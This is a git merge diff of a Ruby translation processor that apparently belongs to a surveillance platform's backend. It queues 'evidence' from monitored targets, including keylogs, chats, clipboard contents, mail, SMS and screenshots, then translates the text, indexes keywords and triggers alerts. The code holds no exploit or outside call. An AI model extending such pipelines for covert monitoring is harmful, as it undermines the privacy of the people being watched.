Conflicts:
	CHANGELOG
	TODO
	config/VERSION
	config/VERSION_BUILD
	config/blacklist
	config/certs/windows.pfx
	lib/rcs-db/build/linux.rb
	lib/rcs-db/build/windows.rb
	lib/rcs-db/db_objects/item.rb
	lib/rcs-db/license.rb
	lib/rcs-db/position_resolver.rb

+++ lib/rcs-translate/processor.rb
@@ -8,6 +8,7 @@ require_relative 'sdl'
 
 require 'rcs-common/trace'
 require 'rcs-common/fixnum'
+require 'rcs-common/sanitize'
 require 'fileutils'
 
 module RCS
@@ -26,8 +27,11 @@ class Processor
     loop do
       # get the first entry from the queue and mark it as processed to avoid
       # conflicts with multiple processors
-      if entry = coll.find_and_modify({query: {flag: TransQueue::QUEUED}, update: {"$set" => {flag: TransQueue::PROCESSED}}})
+      if (entry = coll.find_and_modify({query: {flag: TransQueue::QUEUED}, update: {"$set" => {flag: TransQueue::PROCESSED}}}))
+        count = coll.find({flag: OCRQueue::QUEUED}).count()
+        trace :info, "#{count} evidence to be processed in queue"
         process entry
+        sleep 1
       else
         #trace :debug, "Nothing to do, waiting..."
         sleep 1
@@ -39,6 +43,9 @@ class Processor
   def self.process(entry)
     ev = Evidence.collection_class(entry['target_id']).find(entry['evidence_id'])
 
+    ev.data[:tr] = "TRANS_IN_PROGRESS"
+    ev.save
+
     start = Time.now
 
     temp = RCS::DB::Config.instance.temp(ev[:_id].to_s)
@@ -48,8 +55,6 @@ class Processor
     dump_to_file(entry['target_id'], ev, temp)
     size = File.size(temp)
 
-    trace :debug, "TEXT: #{temp} (#{size.to_s_bytes})"
-
     # invoke the ocr on the temp file and get the result
     if SDL.translate(temp, output)
       raise "output file not found" unless File.exist?(output)
@@ -57,52 +62,77 @@ class Processor
       raise "unable to process"
     end
 
-    translated_text = File.open(output, 'r') {|f| f.read}
-
     FileUtils.rm_rf temp
-    FileUtils.rm_rf output
 
-    # take a copy of evidence data (we need to do this to trigger the mongoid save)
-    data = ev[:data].dup
-    # remove invalid UTF-8 chars
-    data[:tr] = translated_text
+    if File.exist?(output)
+      translated_text = File.open(output, 'r') {|f| f.read}
+      FileUtils.rm_rf output
+    else
+      raise "no output file"
+    end
 
     # update the evidence with the new text
-    ev[:data] = data
+    ev.data[:tr] = translated_text
     ev[:kw] += translated_text.keywords
+
+    # make them unique to remove duplicate in case of "no translation"
+    ev[:kw].uniq!
 
     ev.save
 
-    trace :info, "Evidence processed in #{Time.now - start} seconds - image #{size.to_s_bytes} -> text #{data[:tr].size.to_s_bytes}"
+    trace :info, "Evidence #{ev[:type]} processed in #{Time.now - start} seconds - text #{size.to_s_bytes} -> tr #{ev.data[:tr].size.to_s_bytes}"
 
+    # check if there are matching alerts for this evidence
+    RCS::DB::Alerting.new_evidence(ev)
+
+  rescue Mongoid::Errors::DocumentNotFound
+    # the evidence is not in the db anymore, ignore
   rescue Exception => e
-    trace :error, "Cannot process evidence: #{e.message}"
-    #trace :error, e.backtrace.join("\n")
-    #FileUtils.rm_rf temp
-    #FileUtils.mv temp, temp + '.jpg'
-    #exit!
+    trace :error, "Cannot process evidence: #{e.class} #{e.message}"
+    trace :error, e.backtrace.join("\n")
+    ev.data[:tr] = "TRANS_ERROR"
+    ev.save
   end
 
   def self.dump_to_file(target, evidence, file)
     content = ''
+
+    trace :debug, "Extracting evidence #{evidence[:type]} to #{file}"
 
     case evidence[:type]
       when 'keylog'
         content = evidence[:data]['content']
       when 'chat'
         content = evidence[:data]['content']
-      when 'mail'
-        #content = evidence[:data]['body']
-        file = RCS::DB::GridFS.get evidence[:data]['_grid'], target
-        content = file.read
+      when 'clipboard'
+        content = evidence[:data]['content']
+      when 'message'
+        if evidence[:data]['type'] == :mail
+          # EML format not supported yet...
+          #file = RCS::DB::GridFS.get evidence[:data]['_grid'], target
+          #content = file.read
+
+          # take the parsed body
+          content = evidence[:data]['body']
+          content = content.strip_html_tags
+        else
+          # sms and mms
+          content = evidence[:data]['content']
+        end
       when 'file'
-        file = RCS::DB::GridFS.get evidence[:data]['_grid'], target
-        content = file.read
+        #grid_file = RCS::DB::GridFS.get evidence[:data]['_grid'], target
+        #content = grid_file.read
+        # take the parsed body
+        content = evidence[:data]['body']
       when 'screenshot'
         content = evidence[:data]['body']
+      else
+        raise 'unknown format'
     end
 
-    File.open(file, 'w') {|f| f.write content} if content
+    raise "no content" unless content
+
+    File.open(file, 'w') {|f| f.write content}
   end
 
 end
